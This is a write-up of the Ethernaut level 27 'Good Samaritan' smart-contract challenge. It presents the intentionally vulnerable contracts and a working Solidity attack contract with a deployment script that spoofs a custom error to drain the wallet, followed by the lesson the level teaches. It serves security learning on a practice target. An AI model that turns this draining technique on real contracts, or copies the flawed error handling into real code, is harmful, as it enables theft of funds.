# Level 27 - Good Samaritan ⏺⏺⏺

{% embed url="https://ethernaut.openzeppelin.com/level/27" %}

### Level Setup

{% hint style="info" %}
This instance represents a Good Samaritan that is wealthy and ready to donate some coins to anyone requesting it.

Would you be able to drain all the balance from his Wallet?

Things that might help:

* [Solidity Custom Errors](https://blog.soliditylang.org/2021/04/21/custom-errors/)
{% endhint %}

### Level Contract

{% embed url="https://github.com/OpenZeppelin/ethernaut/blob/a89c8f7832258655c09fde16e6602c78e5e99dbd/contracts/src/levels/GoodSamaritan.sol" %}

{% code lineNumbers="true" fullWidth="true" %}
```solidity
// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import "openzeppelin-contracts-08/utils/Address.sol";

contract GoodSamaritan {
    Wallet public wallet;
    Coin public coin;

    constructor() {
        wallet = new Wallet();
        coin = new Coin(address(wallet));

        wallet.setCoin(coin);
    }

    function requestDonation() external returns (bool enoughBalance) {
        // donate 10 coins to requester
        try wallet.donate10(msg.sender) {
            return true;
        } catch (bytes memory err) {
            if (keccak256(abi.encodeWithSignature("NotEnoughBalance()")) == keccak256(err)) {
                // send the coins left
                wallet.transferRemainder(msg.sender);
                return false;
            }
        }
    }
}

contract Coin {
    using Address for address;

    mapping(address => uint256) public balances;

    error InsufficientBalance(uint256 current, uint256 required);

    constructor(address wallet_) {
        // one million coins for Good Samaritan initially
        balances[wallet_] = 10 ** 6;
    }

    function transfer(address dest_, uint256 amount_) external {
        uint256 currentBalance = balances[msg.sender];

        // transfer only occurs if balance is enough
        if (amount_ <= currentBalance) {
            balances[msg.sender] -= amount_;
            balances[dest_] += amount_;

            if (dest_.isContract()) {
                // notify contract
                INotifyable(dest_).notify(amount_);
            }
        } else {
            revert InsufficientBalance(currentBalance, amount_);
        }
    }
}

contract Wallet {
    // The owner of the wallet instance
    address public owner;

    Coin public coin;

    error OnlyOwner();
    error NotEnoughBalance();

    modifier onlyOwner() {
        if (msg.sender != owner) {
            revert OnlyOwner();
        }
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    function donate10(address dest_) external onlyOwner {
        // check balance left
        if (coin.balances(address(this)) < 10) {
            revert NotEnoughBalance();
        } else {
            // donate 10 coins
            coin.transfer(dest_, 10);
        }
    }

    function transferRemainder(address dest_) external onlyOwner {
        // transfer balance left
        coin.transfer(dest_, coin.balances(address(this)));
    }

    function setCoin(Coin coin_) external onlyOwner {
        coin = coin_;
    }
}

interface INotifyable {
    function notify(uint256 amount) external;
}
```
{% endcode %}

### Exploit

{% tabs %}
{% tab title="Anvil" %}
```bash
make anvil-exploit-level-27

<INPUT_LEVEL_INSTANCE_CONTRACT_ADDRESS>
```
{% endtab %}

{% tab title="Holesky" %}
```bash
make holesky-exploit-level-27

<INPUT_LEVEL_INSTANCE_CONTRACT_ADDRESS>
```
{% endtab %}
{% endtabs %}

{% tabs %}
{% tab title="Exploit Contract" %}
{% embed url="https://github.com/EridianAlpha/ethernaut-foundry/blob/5baa0af7e2d29b6e478e314d0e41eb757bf5923f/src/Level27.sol" %}

{% code title="src/Level27.sol" %}
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// ================================================================
// │                    LEVEL 27 - GOOD SAMARITAN                 │
// ================================================================
interface IGoodSamaritan {
    function coin() external view returns (address coinAddress);
    function notify(uint256 amount) external;
    function requestDonation() external returns (bool enoughBalance);
}

interface ICoin {
    function balances(address account) external view returns (uint256);
}

contract AttackContract {
    error NotEnoughBalance();

    IGoodSamaritan goodSamaritan;

    function notify(uint256 /* amount */ ) public view {
        // Check the balance of this contract, and if it is 10,
        // then revert with the custom error message NotEnoughBalance
        // to trigger the transferRemainder function in the GoodSamaritan contract
        ICoin coin = ICoin(goodSamaritan.coin());

        if (coin.balances(address(this)) == 10) {
            revert NotEnoughBalance();
        }
    }

    function callGoodSamaritan(address targetContractAddress) public {
        goodSamaritan = IGoodSamaritan(targetContractAddress);
        goodSamaritan.requestDonation();
    }
}
```
{% endcode %}
{% endtab %}

{% tab title="Exploit Deployment Script" %}
{% embed url="https://github.com/EridianAlpha/ethernaut-foundry/blob/5baa0af7e2d29b6e478e314d0e41eb757bf5923f/script/Level27.s.sol" %}

{% code title="script/Level27.s.sol" %}
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {HelperFunctions} from "script/HelperFunctions.s.sol";

import {AttackContract} from "src/Level27.sol";

// ================================================================
// │                    LEVEL 27 - GOOD SAMARITAN                 │
// ================================================================
interface IGoodSamaritan {
    function coin() external view returns (address coinAddress);
}

interface ICoin {
    function balances(address account) external view returns (uint256);
}

contract Exploit is Script, HelperFunctions {
    function run() public {
        address targetContractAddress = getInstanceAddress();

        vm.startBroadcast();
        AttackContract attackContract = new AttackContract();
        attackContract.callGoodSamaritan(targetContractAddress);
        vm.stopBroadcast();
    }
}
```
{% endcode %}
{% endtab %}
{% endtabs %}

Submit instance... 🥳

### Completion Message

{% hint style="info" %}
Congratulations!

Custom errors in Solidity are identified by their 4-byte ‘selector’, the same as a function call. They are bubbled up through the call chain until they are caught by a catch statement in a try-catch block, as seen in the GoodSamaritan's `requestDonation()` function. For these reasons, it is not safe to assume that the error was thrown by the immediate target of the contract call (i.e., Wallet in this case). Any other contract further down in the call chain can declare the same error and throw it at an unexpected location, such as in the `notify(uint256 amount)` function in your attacker contract.
{% endhint %}

### Notes

{% embed url="https://blog.dixitaditya.com/ethernaut-level-27-good-samaritan" %}
